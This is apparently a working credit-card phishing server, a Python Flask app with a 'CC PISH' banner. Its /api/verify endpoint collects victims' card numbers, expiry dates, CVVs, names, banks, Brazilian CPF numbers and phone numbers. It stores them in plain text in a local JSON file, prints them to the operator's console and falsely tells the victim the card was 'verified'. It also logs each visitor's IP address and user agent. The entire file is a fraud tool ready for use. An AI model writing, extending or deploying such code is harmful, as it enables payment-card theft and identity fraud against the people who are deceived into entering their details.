from flask import Flask, render_template, request, jsonify
import re
import os
import json
from datetime import datetime
import logging
from pystyle import Colors, Write
from time import time
import socket

app = Flask(__name__, static_folder='static')

# --=== Logging Configuration ===--
log_file = './logs/app.log'
file_handler = logging.FileHandler(log_file, mode='a', encoding='utf-8')
file_handler.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s - %(message)s')
file_handler.setFormatter(formatter)
werkzeug_logger = logging.getLogger('werkzeug')
werkzeug_logger.setLevel(logging.INFO)
werkzeug_logger.addHandler(file_handler)
werkzeug_logger.propagate = False 
app.logger.addHandler(file_handler)
app.logger.setLevel(logging.INFO)

# --=== Application Configuration ===--
app.config['TEMPLATES_AUTO_RELOAD'] = True
app.config['DEBUG'] = True

# --=== Storage Configuration ===--
CARDS_DIR = 'json'
CARDS_FILE = os.path.join(CARDS_DIR, 'cards.json')

Banner = fr''' 
_________ _________   __________.___  _________ ___ ___  
\_   ___ \\_   ___ \  \______   \   |/   _____//   |   \ 
/    \  \//    \  \/   |     ___/   |\_____  \/    ~    \
\     \___\     \____  |    |   |   |/        \    Y    /
 \______  /\______  /  |____|   |___/_______  /\___|_  / 
        \/        \/                        \/       \/  

'''

baleia = fr'''
      ":"
    ___:____     |"\/"|
  ,'        `.    \  /
  |  O        \___/  |
~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~
[GITHUB: lalaio1] [Telegram: lalaio1]
'''

def init_storage():
    if not os.path.exists(CARDS_DIR):
        os.makedirs(CARDS_DIR)
    
    if not os.path.exists(CARDS_FILE):
        with open(CARDS_FILE, 'w') as f:
            json.dump([], f, indent=4)

def save_card(data):
    try:
        with open(CARDS_FILE, 'r+') as f:
            cards = json.load(f)
            
            data['timestamp'] = datetime.now().isoformat()
            
            cards.append(data)
            
            f.seek(0)
            json.dump(cards, f, indent=4, ensure_ascii=False)
            f.truncate()
            
    except Exception as e:
        print(f"Erro ao salvar cartão: {str(e)}")
        raise

@app.route('/')
def home():
    return render_template('index.html')


log_header = f"""
╔══════════════════════════════════════════════╗
║ 💾 [+] Cartão salvo com sucesso!             ║
╠══════════════════════════════════════════════╣
"""

@app.route('/api/verify', methods=['POST'])
def verify_card():
    try:
        data = request.json
        
        required_fields = ['number', 'expiry', 'cvv', 'name', 'bank', 'cpf', 'phone']
        if not all(key in data for key in required_fields):
            return jsonify({'error': 'Dados incompletos'}), 400
        
        if not re.match(r'^\d{16}$', data['number']):
            return jsonify({'error': 'Número do cartão inválido'}), 400
        
        if not re.match(r'^(0[1-9]|1[0-2])\/\d{2}$', data['expiry']):
            return jsonify({'error': 'Data de validade inválida'}), 400
        
        if not re.match(r'^\d{3}$', data['cvv']):
            return jsonify({'error': 'CVV inválido'}), 400
        
        save_card(data)
        Write.Print(log_header, Colors.cyan_to_blue, interval=0)
        for key, value in data.items():
            formatted_line = f"║ {key.capitalize():<12}: {value}"
            spacing = 47 - len(formatted_line)
            if spacing > 0:
                formatted_line += " " * spacing
            formatted_line += "║"
            Write.Print(formatted_line + "\n", Colors.blue_to_cyan, interval=0)

        Write.Print("╚══════════════════════════════════════════════╝\n", Colors.cyan_to_blue, interval=0)

        return jsonify({
            'success': True,
            'message': 'Cartão verificado com sucesso!',
            'data': {
                'number': data['number'][:4] + '****' + data['number'][-4:],
                'bank': data['bank'],
                'timestamp': datetime.now().isoformat()
            }
        }), 200
    
    except Exception as e:
        return jsonify({'error': f'Erro no servidor: {str(e)}'}), 500


ip_last_log = {}

@app.before_request
def log_visit():
    if request.path.startswith('/static/') or request.path.endswith(('favicon.ico',)):
        return

    if request.method not in ['GET', 'POST']:
        return

    ip = request.remote_addr
    now = time()
    cooldown = 120

    if ip in ip_last_log and now - ip_last_log[ip] < cooldown:
        return  

    ip_last_log[ip] = now  

    log_message = f"""
 [+] Acesso detectado:
    │_ IP: {ip}
    │__ User Agent: {request.headers.get('User-Agent', 'Unknown')}
    │___ Data/Hora: {datetime.now().isoformat()}
    """
    Write.Print(log_message, Colors.cyan_to_blue, interval=0)
    
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"
    
if __name__ == '__main__':
    try:
        init_storage()
        local_ip = get_local_ip()
        Write.Print(f'{Banner}', Colors.cyan_to_blue, interval=0)
        Write.Print(f"\n * Acesse a aplicacao pela rede local em: http://{local_ip}:5000\n", Colors.white, interval=0)
        Write.Print(f" * Ou localmente em: http://127.0.0.1:5000\n", Colors.white, interval=0)
        app.run(host='0.0.0.0', port=5000, debug=False)
        Write.Print(f'{baleia}', Colors.cyan_to_blue, interval=0)
    except Exception as e:
        print(f"Erro ao iniciar a aplicacao: {str(e)}")